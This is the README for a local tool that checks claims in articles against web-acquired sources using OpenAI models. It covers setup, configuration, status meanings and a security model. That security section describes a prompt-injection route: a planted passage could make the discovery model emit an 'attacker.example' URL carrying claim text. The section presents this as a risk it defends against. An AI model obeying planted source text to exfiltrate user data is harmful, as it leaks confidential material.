# Research Verification Workbench

**Status: Public preview 0.1.0**

Research Verification Workbench checks a written article, memo or brief against its sources, claim by claim, before you rely on it. It is built for people who publish or file evidence-heavy writing, such as IP practitioners, analysts and researchers. It is adversarial: it assumes a claim is unproven until a quoted passage from an acquired source supports it.

What it does, in order:

1. **Import** an article (`.docx`, `.pdf`, `.md`, `.markdown`, `.txt`) or paste it. Each save is an immutable, numbered checkpoint.
2. **Extract claims.** A model splits the text into atomic, checkable assertions, each tied to its span in the article. A span must be found in the article exactly or after normalizing quotes, spacing and elisions; a single span that cannot be found fails the whole extraction.
3. **Build the corpus.** Reuses sources already in your local warehouse, then (optionally) searches the web for primary sources, downloads them, hashes them and links them to the claims. You can also register sources by URL yourself.
4. **Verify.** A model compares each claim with at most 5 passages from a sealed snapshot of the corpus, chosen by shared words. The outcome is one of VERIFIED, OVERSTATED, MISCITED, UNSUPPORTED, CONTRADICTED, STALE, UNVERIFIABLE, FABRICATED or NOT_APPLICABLE, with a pin cite, the gap, and a recommended fix. See [What each status means](#what-each-status-means): a claim with nothing to compare is UNVERIFIABLE and says so.
5. **Review adversarially (optional).** An independent discovery pass, a red-team challenge and a reconciliation, without editing your text.
6. **Fix draft (optional).** A model proposes a revised version that addresses every finding. It is saved as a new checkpoint with an issue-by-issue audit and must be verified again.
7. **Export** the report as CSV, XLSX, DOCX or PDF.

> **Cost.** In the default mode every model step calls the paid OpenAI API with **your own API key**, billed to your OpenAI account. A long article can need hundreds of calls. The app enforces call-count and input-size limits (see [Configuration](#configuration)), but these are not dollar limits. Set a monthly budget in your OpenAI account before use.
>
> **Confidentiality.** Article text, extracted claims and source passages are sent to the model provider you configure. Word comments, headers, footers, notes and tracked insertions are part of the extracted text, so they are sent too. When you build a corpus with discovery in the default mode, OpenAI's hosted web search receives search queries derived from your claims, and source websites receive your download requests. Do not process privileged, confidential, client or export-controlled material unless your professional obligations, your client's consent and the provider's terms permit it. See [DISCLAIMER.md](DISCLAIMER.md).

## Requirements

- Windows 10/11, macOS or Linux.
- Either **Docker** with Compose v2.24 or later (simplest), or:
  - **Node.js 22.9 or later** (24 recommended),
  - **PostgreSQL 16** (other recent versions are untested),
  - **Python 3.10+** for DOCX/PDF import and DOCX/PDF/XLSX export (Markdown/text import and CSV export work without it).
- An OpenAI API key: <https://platform.openai.com/api-keys>. Use is subject to the [OpenAI terms](https://openai.com/policies/) and pricing.
- Network access to `api.openai.com` and to the source websites you want to acquire.

## Install and start

### Option A: Docker Compose (bundled PostgreSQL)

```sh
cp .env.example .env
# edit .env: set OPENAI_API_KEY and a long random POSTGRES_PASSWORD
docker compose up -d --build
```

Open <http://127.0.0.1:3080>. Migrations run automatically every time the app container starts. Data lives in two named Docker volumes (`pgdata`, `workbench-data`). On Windows you can run `.\scripts\start.ps1 -Docker` instead; on macOS/Linux `scripts/start.sh --docker`.

**Never publish the container port on all interfaces.** Do not run `docker run -p 3080:3080` (or edit the compose `ports:` entry to drop `127.0.0.1:`): the container listens on `0.0.0.0` internally and the workbench has no user accounts, so that would expose it to your whole network. Always use `-p 127.0.0.1:3080:3080`. On a shared machine, other local users can still reach `127.0.0.1`: set `WORKBENCH_TOKEN` (below) there.

The compose file pins both base images by digest, publishes the app on `127.0.0.1` only, gives the database no published port and puts it on an internal-only network, and runs the app as a non-root user with all Linux capabilities dropped, a read-only root filesystem (only `/tmp` in memory and the `workbench-data` volume are writable), and memory and process limits on both containers. **The compose setup was not run for this commit** (see [Limitations](#limitations)).

### Option B: Node.js with your own PostgreSQL

1. Create an empty database and a role that owns it, for example:
   ```sql
   CREATE ROLE workbench LOGIN PASSWORD 'choose-a-long-random-value';
   CREATE DATABASE research_workbench OWNER workbench;
   ```
   The first migration runs `CREATE EXTENSION IF NOT EXISTS pgcrypto` (a trusted extension on PostgreSQL 13+, so the database owner can create it).
2. Configure and install:
   ```sh
   cp .env.example .env
   # edit .env: OPENAI_API_KEY, and DATABASE_URL=postgres://workbench:...@127.0.0.1:5432/research_workbench
   npm ci --omit=dev
   npm run migrate
   npm start
   ```
3. Open <http://127.0.0.1:3080>.

`.\scripts\start.ps1` (Windows) or `scripts/start.sh` (macOS/Linux) performs steps 2-3 for you. `npm start` and `npm run migrate` read `.env` from the install folder.

#### Document runtime (optional, for DOCX/PDF)

```sh
python -m venv .venv
# Windows: .venv\Scripts\python -m pip install ...   macOS/Linux: .venv/bin/python -m pip install ...
.venv/bin/python -m pip install --require-hashes -r requirements-documents.txt   # pypdf, XlsxWriter (hash-pinned)
.venv/bin/python -m pip install python-docx reportlab
```

Then set `ARTIFACT_PYTHON` in `.env` to that interpreter (for example `.venv/bin/python` or `.venv\Scripts\python.exe`, as an absolute path). The Docker image already contains this runtime, and Compose always uses it, whatever `.env` says. Note that `python-docx` and `reportlab` are not hash-pinned here; the Docker image takes them from Debian packages.

### Quick start in the browser

1. Create a project, then paste an article or import a file.
2. **Extract claims** and read the claim ledger. Marking claims that need no outside evidence is done through the API (`assertions-review`).
3. **Build corpus** (shows a query/cost estimate first). Verify stays disabled in the page until a sealed corpus exists. A source URL added by hand in the page is only registered: the page has no download button, so it stays unread until you call `POST /api/projects/{id}/sources/{source_id}/acquire` ([docs/API.md](docs/API.md)) and build the corpus or verify again.
4. **Verify**, then open findings, read the quoted passages and download the original sources. Sources that could not be used appear in the Sources panel marked NOT USED.
5. Export a report, or run **Fix draft** and verify the new version again.

The readiness panel (`GET /api/readiness`) shows what is configured: database, storage, model, discovery, document runtime and today's AI usage.

## Configuration

All settings are environment variables, normally kept in `.env`. [.env.example](.env.example) lists every one with comments.

| Variable | Default | Purpose |
|---|---|---|
| `ORCHESTRATION_MODE` | `openai` | `openai` (direct API) or `n8n` (your own webhooks, see [extras/n8n](extras/n8n/README.md)) |
| `OPENAI_API_KEY` | none | Required in `openai` mode; the server refuses to start without it |
| `OPENAI_MODEL` | `gpt-5.4` | Default model |
| `CLAIM_EXTRACTION_MODEL`, `VERIFICATION_MODEL`, `REVISION_MODEL` | `OPENAI_MODEL` | Per-role models |
| `DISCOVERY_MODEL` | `gpt-5.4-mini` | Model used with OpenAI web search for source discovery |
| `VERIFICATION_CONCURRENCY` | `3` | Parallel verification calls (1-8) |
| `DATABASE_URL` or `PGHOST`/`PGPORT`/`PGDATABASE`/`PGUSER`/`PGPASSWORD` | `PGDATABASE=research_workbench` | PostgreSQL connection |
| `POSTGRES_PASSWORD` | none | Docker Compose only: password for the bundled database |
| `HOST`, `PORT` | `127.0.0.1`, `3080` | Listen address. Non-loopback hosts are refused unless `ALLOW_NONLOOPBACK_BIND=1` |
| `WORKBENCH_TOKEN` | none | Optional access token (16+ characters). When set, every `/api/` route requires it. See [Security model](#security-model) |
| `DISCOVERY_TRUSTED_HOSTS` | none | Comma-separated extra hosts (and their subdomains) allowed to keep query strings in discovered URLs; adds to the built-in list |
| `DISCOVERY_REQUIRE_ACCEPTANCE` | off | Set `1` to stop automatic fetching of model-discovered URLs (see Security model) |
| `WORKBENCH_PORT` | `3080` | Docker Compose only: host port (always on 127.0.0.1) |
| `WORKBENCH_DATA_DIR` | `./storage` | Root for acquired sources and reports |
| `SOURCE_STORAGE_ROOT`, `PROJECT_STORAGE_ROOT` | `<data dir>/sources`, `<data dir>/projects` | Separate storage locations |
| `ARTIFACT_PYTHON` | none | Python document runtime (see above) |
| `AI_DAILY_CALL_LIMIT` | `500` | Model calls per UTC day, across the app |
| `AI_DAILY_INPUT_BYTES` | `33554432` | Request bytes sent to the model per UTC day |
| `AI_JOB_CALL_LIMIT` | `400` | Model calls per operation |
| `AI_JOB_TIMEOUT_MS` / `AI_DISCOVERY_TIMEOUT_MS` | 30 / 45 minutes | Stop dispatching new calls after this |
| `MIN_FREE_STORAGE_BYTES` | 512 MB | Refuse new work below this free space |
| `N8N_DRAFT_WEBHOOK_URL`, `N8N_DISCOVERY_WEBHOOK_URL`, `N8N_WEBHOOK_AUTH_HEADER` | none | `n8n` mode only |
| `SOURCE_CORPUS_URL` + `SOURCE_CORPUS_TOKEN` or `SOURCE_CORPUS_TOKEN_FILE` | none | Optional Get Files service (aliases `GET_FILES_URL`, `GET_FILES_TOKEN`, `GET_FILES_TOKEN_FILE`) |

## Optional: Get Files / Source Corpus integration

If you run the separately distributed **Get Files** service, the workbench can import an exact, hash-identified document from it (`POST /api/projects/{id}/corpus-import`, see [docs/API.md](docs/API.md)), and a command-line bridge can search it or submit a project's sources to it:

```sh
node --env-file=.env scripts/corpus.mjs search "double patenting" legal
node --env-file=.env scripts/corpus.mjs export-project <project-uuid> legal
```

Without `SOURCE_CORPUS_URL` the feature is simply off: the import route answers 503 and the script exits with a short explanation. Plain HTTP is accepted only for local addresses (from inside Docker use `http://host.docker.internal:<port>`). `export-project` is the only feature that writes to another service, and only when you run it.

## Programmatic use

The browser UI uses a JSON HTTP API that other local tools can call. It is documented in [docs/API.md](docs/API.md).

## What each status means

Every status is a label on one claim, not a certification. Read the quoted passage yourself.

| Status | Who decides | What it means |
|---|---|---|
| `VERIFIED` | Model, plus mechanical tests | A model judged a passage adequate for the claim. Code checks that the passage it quotes appears verbatim in that passage and is at least 8 words or 40 characters long, and that any quotation in the claim appears in a qualifying source. These tests prove the words exist, not that they support the claim. |
| `OVERSTATED`, `MISCITED`, `CONTRADICTED`, `STALE`, `FABRICATED` | Model, with one exception | The model's reading of the passages it was shown: `STALE` has no freshness check behind it and `FABRICATED` has no lookup behind it. The exception: when a quotation of 5 or more words in the claim is in no qualifying source, ignoring case, spacing and punctuation, code changes a model's `VERIFIED` to `MISCITED` and records `QUOTE_NOT_IN_SOURCES`. A shorter quoted phrase is noted only, because it may be a defined term. The check sees only quotations in claims the model extracted, and a citation itself is not checked by code. |
| `UNSUPPORTED` | Model | The model examined the retrieved passages and found no support. The gap says how many it saw, for example "Not found in the 3 passages retrieved". Only the best word matches are retrieved, so support elsewhere in a source may not have been seen. |
| `UNVERIFIABLE` | Code or model | Usually nothing was compared: `not_checked_reason` says why, and the gap begins "Nothing was checked". It says nothing about whether the claim is true. See below. |
| `NOT_APPLICABLE` | Code, from a model's or person's flag | The claim is marked as needing no outside source. It was not checked and is not verified. |
| `NOT_CHECKED` | Display only | An older run that saved a provider outage as UNVERIFIABLE. Stored data is unchanged. |

`not_checked_reason` on a result:

| Reason | Meaning |
|---|---|
| `NO_SOURCES` | No source is linked to the claim. |
| `NO_ELIGIBLE_SOURCE` | Sources are linked, but none qualifies: only `PRIMARY` does when the claim requires a primary source, `PRIMARY` or `SECONDARY` otherwise. `UNKNOWN` never does. |
| `SOURCES_UNAVAILABLE` | A qualifying source could not be read: its download failed or was blocked, it was held for review, it has no readable text, or it looks like a login or access page. |
| `NO_MATCHING_PASSAGE` | Qualifying text exists, but no passage shares a word with the claim, so nothing went to the model. |
| `INVALID_MODEL_REPLY` | Passages were sent, but the reply failed validation, for example a quotation that is not in the passage. |
| `OLDER_RUN` | Display only. A run from before `not_checked_reason` existed had no eligible passage, so nothing went to the model, and it saved `UNSUPPORTED` or `UNVERIFIABLE` in fixed wording. |

**`PRIMARY` and `SECONDARY` are a model's judgment unless a person set them.** A discovered source takes the label the discovery model gave it; nothing checks that label against the document. Each result records `source_class` and `source_class_assigned_by`, shown in the page and in exports: `MODEL`, `CALLER` (a person or a client program through the page or API), `DEFAULT` (a reused source nobody assessed, treated as `SECONDARY`) or `UNKNOWN` (linked before this was recorded). Whether a claim needs a primary source at all is also set by the extraction model, unless a person corrects it in claim review.

**What the Workbench can tell about a blocked or login-walled source.** HTTP errors, refused addresses and download failures are recorded. A page that answers HTTP 200 is treated as a suspected login or access page only if it is under 2,000 characters and uses typical wording, such as two of "sign in", "subscribe", "enable JavaScript" and "access denied". A longer wall, or one worded differently, is stored as ordinary text. If it shares no words with a claim the claim reads `NO_MATCHING_PASSAGE`; if it does, it goes to the model like any other passage.

## Failure reporting

- If the AI provider fails during verification, the run stops and is marked FAILED with the reason. Claims not yet checked have no result. This covers HTTP errors, connection failures, and a 200 reply that is empty, refused, incomplete or not JSON. Older runs that saved such outages as UNVERIFIABLE display as NOT_CHECKED (stored data unchanged) and stay out of Fix draft. Retrying after a failed run pays again for claims already judged, because a new run starts over and calls the model for every claim that has passages.
- A reply that is valid but contains an invalid quotation stays a per-claim UNVERIFIABLE (`INVALID_MODEL_REPLY`) in a run that completes.
- A discovered source that could not be used is listed in the discover response (`source_failures`), in the workspace (`discovery_failures`) and on the verification run (`evidence_gaps`), and its claims follow the table above.
- A run can be COMPLETE with nothing compared. `assertions_attempted` counts only claims whose passages were sent to the model. Older runs counted every claim that needed a source, so where passage counts were not recorded the page says the number that reached the model is unknown.
- Older runs saved a claim with nothing to compare as `UNSUPPORTED` or `UNVERIFIABLE`. The workspace API, page, exports and comparisons now show it as `UNVERIFIABLE` with `OLDER_RUN`, and the saved status stays visible as the original. The stored row is not rewritten, and it goes to Fix draft like any other claim with nothing compared. Red-team and reconciliation text written by those older runs is stored as it was and may still treat these claims as findings.
- In n8n mode, `/api/readiness` asks the gateway (`/healthz`) whether it is answering. Direct OpenAI mode has no free probe and reports the credential only.
- Temporary provider failures return HTTP 503. A rejection that retrying cannot fix (bad login, disallowed model, other 4xx) returns 500 with its reason, so scripts can stop retrying.
- Normalized text that is gzip bytes or over 1% control characters is left out of the sealed snapshot, and its claims report evidence as unavailable. Stray NUL bytes in otherwise good text are removed from passages. Gzip sent without a header is decompressed on new downloads. Already stored unreadable sources stay unreadable until re-acquired or re-extracted.

## Data locations

- **PostgreSQL**: projects, article checkpoints, claims, runs, verification results, audit records, AI usage counters. Nothing is deleted automatically.
- **`WORKBENCH_DATA_DIR`** (default `./storage`): `sources/` holds downloaded originals, normalized text and sealed content-addressed copies; `projects/` holds generated reports.
- Where the storage folder has no hard links (exFAT, FAT, some SMB and 9p mounts), a stored file is published by a checked rename. Readers still see a complete file or none, but in the instant between the check and the rename a file with the same name can be replaced; the read afterwards reports a conflict if its bytes differ.
- Database and files must be backed up together. See [docs/OPERATIONS.md](docs/OPERATIONS.md) for the backup/restore utility.

## Security model

- **Single user, local only.** There is no login. The server listens on 127.0.0.1 by default and refuses other addresses unless you explicitly opt in; Docker Compose publishes the port on 127.0.0.1 only. Anyone and any process that can reach the port can use the app and spend your API budget. Do not expose it to a network or the internet.
- **Optional access token.** Set `WORKBENCH_TOKEN` to a random value of 16+ characters (for example `node -e "console.log(require('crypto').randomBytes(24).toString('hex'))"`). API requests must then send `Authorization: Bearer <token>`. The web page asks for the token once, exchanges it at `POST /api/session` for an HttpOnly, SameSite=Strict cookie, and then works normally (downloads included). The static page itself carries no data and stays open. Use this on shared machines or whenever other local users or processes should not reach the app. It is a single shared secret over plain HTTP on loopback, not a user-account system.
- **Browser attacks are blocked**: requests must carry a loopback `Host` header (DNS-rebinding defence), foreign or `null` `Origin` and cross-site Fetch Metadata are rejected, and JSON routes require `application/json`.
- **Untrusted sources**: source downloads reject private, loopback, link-local, shared and multicast addresses (including through redirects and DNS rebinding), are size- and time-limited, and stored originals are served as sandboxed attachments.
- **Credentials** come only from environment variables or files you create; they are never stored in the database, written to logs or passed to document subprocesses. Error responses carry a controlled message and a request ID, not raw exception text; the `error_message` kept on run records is described in [docs/API.md](docs/API.md).
- **Evidence integrity**: each verification run binds a sealed snapshot of claim and source hashes. A changed or missing stored original or normalized text fails the run before any model call. Text imported from Get Files is also compared with the hash in its manifest at import, when the service supplies one. These checks show the stored files have not changed; they do not show the extracted text is a faithful copy of the document.
- **Model-chosen URLs are screened.** Discovery fetches URLs that a web-search model returns, and a planted passage could try to make the model emit `https://attacker.example/?q=<claim text>`. Before any fetch, query strings and fragments are removed from discovered URLs unless the host is trusted: `.gov`, `.mil`, `gov.uk`, `europa.eu`, `epo.org`, `wipo.int`, `courtlistener.com`, `law.cornell.edu`, `arxiv.org`, `doi.org` and their subdomains, plus anything in `DISCOVERY_TRUSTED_HOSTS`. The host itself is still contacted, and path segments can still carry data, so this limits rather than eliminates the channel. For full control set `DISCOVERY_REQUIRE_ACCEPTANCE=1`: discovered URLs are then **not fetched**; they are recorded with disposition `HUMAN_REVIEW` (table `discovery_candidates`, with the reason) and you add the ones you accept through the Sources panel. The held URLs appear in the Sources panel marked NOT USED and in the workspace as `discovery_failures`, but the page has no accept button and no download button, which is why the default is off.
- **Temporary files** holding uploaded articles and report data are written to a private temporary directory (mode 0700, files 0600, on Linux and macOS; on Windows these modes do not apply and your user's temporary folder protects them) and removed afterwards. If removal fails, a log line says so.
- **Prompt injection.** Extraction, verification, classification and review prompts tell the model that text inside documents and sources is untrusted data, and mark it as such in the request. This lowers the risk and does not remove it: model output is untrusted, can be wrong and can be influenced by text inside sources. Read the quoted passages yourself.

See [SECURITY.md](SECURITY.md) for reporting vulnerabilities.

## Limitations

- Verification quality depends on the model and on which sources were acquired. A VERIFIED result means a model judged a quoted passage adequate; it is not legal or factual certification. See [What each status means](#what-each-status-means).
- Document extraction covers native text, DOCX tables, notes, headers and footers. Image-only PDF pages fail; scanned content, figures and layout need human review. No OCR.
- Paywalled, login-protected or script-rendered sources usually cannot be acquired, and not every login page can be recognized (see [What each status means](#what-each-status-means)).
- Usage limits count calls and bytes, not money. Timeouts stop new calls but cannot cancel work a provider already accepted.
- No real model has been called in the publisher's testing of this commit: extraction, verification and discovery (web search through the Responses API) ran only against a fake provider. How accurate a real model is, and whether the default model names and strict schemas work on the live API, is unknown.
- The Docker Compose setup and the Dockerfile were not built or run for this commit. An earlier commit's image was built and started during a suite installer test. The offline tests and a run against real PostgreSQL 16 with a fake provider were done for this commit (see CHANGELOG). The container harness (`scripts/test-checkpoint-postgres.mjs`) needs Docker and was not run.
- One app process per database (enforced by an advisory lock).

## Tests

```sh
npm ci
npm test
```

The suite runs offline with no database, no network and no API key. Four XLSX/readiness tests are skipped unless a Python document runtime is found (`ARTIFACT_PYTHON` or `.venv`). Five tests that need real PostgreSQL are skipped unless `TEST_DATABASE_URL` points at a scratch database whose name contains `test`.

## Uninstall

- Docker: `docker compose down` stops the app; `docker compose down -v` **also deletes the database and stored files**. Remove the image with `docker image rm research-workbench:0.1.0`.
- Node: stop the process, drop the database (`DROP DATABASE research_workbench;`), delete the install folder, and delete `WORKBENCH_DATA_DIR` if you moved it elsewhere.
- Revoke the OpenAI API key you created for this tool if you no longer need it.

## License and disclaimer

PolyForm Noncommercial License 1.0.0: free for noncommercial use (personal, research, education, nonprofit). Commercial use (including use by or for a law firm, company or paying client) requires a separate license from Brightline IP: contact timisbright@gmail.com. See
[LICENSE](LICENSE) and [NOTICE](NOTICE). Published by Brightline IP. Not legal advice; read [DISCLAIMER.md](DISCLAIMER.md).
